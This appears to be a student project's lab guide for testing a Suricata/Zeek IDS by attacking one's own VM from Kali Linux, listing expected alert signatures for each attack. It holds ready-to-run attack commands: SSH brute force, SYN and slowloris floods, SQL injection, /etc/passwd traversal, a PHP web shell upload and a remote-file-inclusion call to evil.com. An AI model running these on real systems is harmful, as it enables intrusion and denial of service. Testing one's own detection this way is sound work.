# Kali Linux Attack Guide - IDS Testing

## Important: Distributed Architecture

Your IDS platform uses **two separate VMs**:

- **IDS VM** - Runs Suricata & Zeek (monitoring network traffic)
- **Logging VM** - Runs Elasticsearch, Backend API, Frontend (data analysis & dashboard)

**⚠️ CRITICAL**: Attack the **IDS VM**, not the Logging VM!

Only the IDS VM has Suricata/Zeek monitoring traffic. Attacking the Logging VM won't generate IDS alerts.

---

## Prerequisites

### Find Your IDS VM IP Address

**On the IDS VM:**
```bash
ip addr show | grep "192.168"
# or
hostname -I
```

**Let's say it's**: `192.168.56.129` (example - use your actual IP)

### Ensure Network Connectivity

**From Kali Linux:**
```bash
# Ping IDS VM
ping 192.168.56.129

# Check if web services are accessible
curl -I http://192.168.56.129

# Should get response (even if 404, it means reachable)
```

---

## Preparation on Logging VM

Before attacking, prepare the Logging VM to receive and display data:

```bash
# On Logging VM
cd ~/PycharmProjects/FYP_Test2

# 1. Clear old logs (optional, for clean demo)
sudo ./clear-ids-logs.sh

# 2. Start all services
./start-logging-vm.sh

# 3. Verify services
./check-logging-vm.sh

# 4. Open dashboard
# http://<LOGGING_VM_IP>:3000
```

---

## Kali Linux Attack Commands

### Replace `<IDS_VM_IP>` with your actual IDS VM IP address!

---

### 1. 🔍 Port Scanning (Nmap)

```bash
# Basic SYN scan
sudo nmap -sS <IDS_VM_IP>

# Aggressive scan with OS detection
sudo nmap -A -T4 <IDS_VM_IP>

# All ports
sudo nmap -p- <IDS_VM_IP>

# Service version detection
sudo nmap -sV -p 1-1000 <IDS_VM_IP>
```

**Expected Alerts**:
- ET SCAN Nmap Scripting Engine
- ET SCAN Potential Port Scan
- ET SCAN Possible Nmap Scan

**Verify**:
```bash
# On Logging VM
curl localhost:3001/api/suricata/alerts | jq '.alerts[] | select(.signature | contains("Nmap"))'
```

---

### 2. 🕷️ Web Vulnerability Scanning (Nikto)

```bash
# Basic web scan
nikto -h http://<IDS_VM_IP>

# Scan specific port
nikto -h http://<IDS_VM_IP>:80
nikto -h http://<IDS_VM_IP>:8080

# Aggressive scan
nikto -h http://<IDS_VM_IP> -Tuning 123456789
```

**Expected Alerts**:
- ET SCAN Nikto Scanner Detected
- ET POLICY Suspicious User-Agent
- ET WEB_SERVER Scanner Activity

---

### 3. 💉 SQL Injection (sqlmap)

```bash
# Test URL for SQL injection
sqlmap -u "http://<IDS_VM_IP>/index.php?id=1" --batch

# POST request testing
sqlmap -u "http://<IDS_VM_IP>/login.php" \
  --data="username=admin&password=test" \
  --batch

# Aggressive testing
sqlmap -u "http://<IDS_VM_IP>/search.php?q=test" \
  --level=5 --risk=3 --batch
```

**Manual SQL injection patterns**:
```bash
# OR-based injection
curl "http://<IDS_VM_IP>/page.php?id=1' OR '1'='1"

# UNION-based injection
curl "http://<IDS_VM_IP>/page.php?id=1' UNION SELECT NULL--"

# Error-based injection
curl "http://<IDS_VM_IP>/page.php?id=1' AND 1=CONVERT(int, (SELECT @@version))--"
```

**Expected Alerts**:
- ET WEB_SPECIFIC_APPS SQL Injection Attempt
- ET WEB_SERVER SQL Command in URI
- ET ATTACK_RESPONSE SQL Error

---

### 4. 🔓 SSH Brute Force (Hydra)

```bash
# Basic SSH brute force (use small wordlist for demo)
hydra -l root -P /usr/share/wordlists/rockyou.txt.gz \
  <IDS_VM_IP> ssh -t 4 -V | head -20

# Multiple users
hydra -L users.txt -P passwords.txt \
  <IDS_VM_IP> ssh -t 4

# Specific user with common passwords
echo -e "password\n123456\nadmin\nroot\ntoor" > pass.txt
hydra -l admin -P pass.txt <IDS_VM_IP> ssh -t 2
```

**Expected Alerts**:
- ET SCAN SSH Brute Force Attempt
- ET POLICY SSH Multiple Failed Logins
- ETPRO SCAN Potential SSH Scan

---

### 5. ⚡ DoS Attacks (hping3)

```bash
# SYN flood (limited)
sudo hping3 -S --flood -V <IDS_VM_IP> -p 80 -c 1000

# ICMP flood (limited)
sudo hping3 --icmp --flood <IDS_VM_IP> -c 500

# UDP flood
sudo hping3 --udp --flood <IDS_VM_IP> -p 53 -c 500

# ACK scan
sudo hping3 -A <IDS_VM_IP> -p 80 -c 100
```

**⚠️ Use `-c` flag to limit packets!** Don't actually DoS your own VM.

**Expected Alerts**:
- ET DOS Possible SYN Flood
- ET DOS ICMP Flood
- ET DOS Suspicious Traffic Pattern

---

### 6. 🎯 Web Application Attacks

```bash
# XSS attempt
curl "http://<IDS_VM_IP>/search.php?q=<script>alert('XSS')</script>"

# Directory traversal
curl "http://<IDS_VM_IP>/page.php?file=../../../../etc/passwd"

# Command injection
curl "http://<IDS_VM_IP>/exec.php?cmd=cat%20/etc/passwd"

# Local file inclusion
curl "http://<IDS_VM_IP>/index.php?page=../../../etc/passwd"

# Remote file inclusion
curl "http://<IDS_VM_IP>/index.php?page=http://evil.com/shell.txt"

# File upload (if upload exists)
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X POST http://<IDS_VM_IP>/upload.php \
  -F "file=@shell.php"
```

**Expected Alerts**:
- ET WEB_CLIENT Possible XSS Attempt
- ET WEB_SERVER Directory Traversal
- ET WEB_SERVER Command Injection
- ET WEB_SERVER PHP Script Upload

---

### 7. 🛠️ Metasploit Exploits

```bash
# Start Metasploit
msfconsole

# Web server scanner
use auxiliary/scanner/http/http_version
set RHOSTS <IDS_VM_IP>
run

# Directory scanner
use auxiliary/scanner/http/dir_scanner
set RHOSTS <IDS_VM_IP>
set PATH /
run

# Apache scanner
use auxiliary/scanner/http/apache_mod_status
set RHOSTS <IDS_VM_IP>
run

# Generic HTTP header check
use auxiliary/scanner/http/header
set RHOSTS <IDS_VM_IP>
run
```

**Expected Alerts**:
- ET EXPLOIT Metasploit User-Agent
- ET SCAN Metasploit Framework
- ET POLICY Metasploit Activity

---

### 8. 🌐 DNS Attacks

```bash
# DNS enumeration
dnsrecon -d <IDS_VM_IP>

# DNS zone transfer attempt
dig axfr @<IDS_VM_IP> example.com

# DNS flood (limited)
sudo hping3 --udp --flood <IDS_VM_IP> -p 53 -c 500

# Suspicious DNS query
nslookup malware.wicar.org <IDS_VM_IP>
dig @<IDS_VM_IP> malicious-domain.example.com
```

**Expected Alerts**:
- ET DNS Zone Transfer Attempt
- ET DNS Query for Suspicious Domain
- ET DOS DNS Flood

---

### 9. 🔒 SSL/TLS Attacks

```bash
# SSLscan
sslscan <IDS_VM_IP>:443

# SSLyze
sslyze --regular <IDS_VM_IP>:443

# Test for Heartbleed
nmap -p 443 --script ssl-heartbleed <IDS_VM_IP>

# Test for weak ciphers
nmap --script ssl-enum-ciphers -p 443 <IDS_VM_IP>
```

**Expected Alerts**:
- ET POLICY SSL Certificate Validation
- ET SCAN SSL Scanner Activity

---

### 10. 📡 Network Reconnaissance

```bash
# ARP scan
sudo arp-scan --interface=eth0 --localnet | grep <IDS_VM_IP>

# Traceroute
traceroute <IDS_VM_IP>

# OS fingerprinting
sudo nmap -O <IDS_VM_IP>

# Banner grabbing
nc -v <IDS_VM_IP> 80
nc -v <IDS_VM_IP> 22
nc -v <IDS_VM_IP> 21
```

---

### 11. 💀 Malware Simulation

```bash
# Download EICAR test file
curl http://www.eicar.org/download/eicar.com.txt > eicar.txt

# Send to IDS VM
curl -X POST http://<IDS_VM_IP>/upload \
  -F "file=@eicar.txt"

# Attempt to download from suspicious domain
curl http://malware.wicar.org/
```

**Expected Alerts**:
- ET MALWARE EICAR Test File
- ET POLICY Download from Suspicious Domain

---

### 12. 🔁 Connection Flooding

```bash
# Rapid HTTP connections
for i in {1..100}; do
  curl -s http://<IDS_VM_IP> &
done
wait

# Slowloris attack (use with caution!)
slowloris <IDS_VM_IP> -p 80 -s 200 --sleeptime 10

# Alternative: timeout-based slow requests
for i in {1..50}; do
  (echo -e "GET / HTTP/1.1\r\nHost: <IDS_VM_IP>\r\n" | nc <IDS_VM_IP> 80 && sleep 30) &
done
```

**Expected Alerts**:
- ET DOS Multiple Rapid Connections
- ET DOS Slowloris Attack

---

## Attack Sequence for Demo

### Beginner Level (Start Here)

```bash
IDS_IP="192.168.56.129"  # Change to your IDS VM IP

# 1. Basic port scan
sudo nmap -sS $IDS_IP

# 2. Service detection
sudo nmap -sV -p 22,80,443 $IDS_IP

# 3. Web scan
nikto -h http://$IDS_IP | head -50

# 4. Simple XSS
curl "http://$IDS_IP/?search=<script>alert(1)</script>"

# 5. SQL injection pattern
curl "http://$IDS_IP/?id=1' OR 1=1--"
```

### Intermediate Level

```bash
# 6. Directory traversal
curl "http://$IDS_IP/?file=../../../../etc/passwd"

# 7. SSH brute force (5 attempts)
echo -e "password\nadmin\nroot\n123456\ntoor" > pass.txt
hydra -l admin -P pass.txt $IDS_IP ssh -t 2

# 8. HTTP flood
for i in {1..50}; do curl -s http://$IDS_IP & done

# 9. Command injection
curl "http://$IDS_IP/?cmd=cat%20/etc/passwd"
```

### Advanced Level

```bash
# 10. Aggressive Nmap scan
sudo nmap -A -T4 -sC -sV $IDS_IP

# 11. Metasploit scan
msfconsole -q -x "use auxiliary/scanner/http/http_version; set RHOSTS $IDS_IP; run; exit"

# 12. SYN flood (limited)
sudo hping3 -S --flood -V $IDS_IP -p 80 -c 500
```

---

## Verification After Attacks

### On Logging VM

**1. Check if alerts were generated:**
```bash
# Count alerts in Elasticsearch
curl "localhost:9200/filebeat-*/_count?q=event.module:suricata" | jq

# View recent alerts
curl localhost:3001/api/suricata/alerts | jq '.alerts[] | {signature, severity, source_ip}'
```

**2. Check Suricata raw logs:**
```bash
# Note: This is on the IDS VM, not Logging VM
# You'll need to SSH to IDS VM to view these
ssh user@<IDS_VM_IP>
sudo tail -100 /var/log/suricata/eve.json | grep alert
```

**3. View in Dashboard:**
```
1. Open: http://<LOGGING_VM_IP>:3000
2. Login as Security Analyst or Platform Admin
3. Go to: Alert Monitor or IDS Dashboard
4. Should see alerts with:
   - Attack signatures
   - Source IP (your Kali IP)
   - Severity levels
   - Timestamps
```

---

## Expected Results

After running attacks, you should see:

**In Elasticsearch:**
- 20-50+ Suricata alert documents
- 100-200+ Zeek connection logs
- Various severity levels (High, Medium, Low)

**In Dashboard:**
- 🟢 Suricata IDS: Online
- 🟢 Zeek Network Monitor: Online
- 📊 Alert table populated
- 📈 Timeline showing attack patterns

**Common Alert Signatures:**
```
- ET SCAN Nmap Scripting Engine
- ET SCAN Nikto Scanner
- ET WEB SQL Injection Attempt
- ET SCAN SSH Brute Force
- ET DOS SYN Flood
- ET POLICY Suspicious User-Agent
```

---

## Safety & Ethics

### ✅ Safe to Do

- Attack your own IDS VM
- Use test files (EICAR)
- Use `-c` flag to limit DoS packets
- Use small wordlists for brute force
- Stay on isolated network (192.168.56.x)

### ❌ DO NOT

- Attack production systems
- Attack systems you don't own
- Actually DoS your VM (use packet limits!)
- Run full brute force (will take forever)
- Attack external networks

---

## Troubleshooting

### Issue: No alerts appearing

**Check 1**: Are you attacking the correct VM?
```bash
# Should attack IDS VM, not Logging VM
ping <IDS_VM_IP>
curl http://<IDS_VM_IP>
```

**Check 2**: Is Suricata running on IDS VM?
```bash
# SSH to IDS VM
ssh user@<IDS_VM_IP>
sudo systemctl status suricata
```

**Check 3**: Is data flowing to Logging VM?
```bash
# On Logging VM
curl "localhost:9200/filebeat-*/_count?q=event.module:suricata" | jq
```

**Check 4**: Wait for processing
- Logs take 1-2 minutes to flow through pipeline
- Attack → Suricata → Filebeat → Elasticsearch → API → Dashboard

---

## Demo Script for Assessors

```bash
# Setup (before demo)
IDS_IP="192.168.56.129"  # Your IDS VM

# 1. Show clean dashboard (on Logging VM)
#    http://<LOGGING_VM_IP>:3000

# 2. Run port scan from Kali
sudo nmap -sS $IDS_IP

# 3. Wait 1 minute, refresh dashboard
#    Show: Port scan alerts appear!

# 4. Run SQL injection
curl "http://$IDS_IP/?id=1' UNION SELECT NULL--"

# 5. Wait 30 seconds, refresh
#    Show: SQL injection alert with HIGH severity!

# 6. Run Nikto scan
nikto -h http://$IDS_IP | head -30

# 7. Refresh dashboard
#    Show: Multiple scanner alerts, severity breakdown!

# 8. Explain:
#    - Attack type and pattern
#    - How Suricata detected it
#    - Alert severity and reasoning
#    - Recommended response action
```

---

## Summary

### Key Points

1. **Attack IDS VM** (has Suricata/Zeek), not Logging VM
2. **View results on Logging VM** (dashboard at port 3000)
3. **Wait 1-2 minutes** for logs to flow through pipeline
4. **Use packet limits** for DoS attacks (`-c` flag)
5. **Small wordlists** for brute force attacks

### Command Template

```bash
# Set your IDS VM IP
IDS_IP="<YOUR_IDS_VM_IP>"

# Attack command template
<attack_tool> <attack_options> $IDS_IP
```

---

**Last Updated**: 2025-11-13
**Architecture**: Distributed Multi-VM IDS Platform
**Target**: IDS VM (Sensor) - NOT Logging VM!
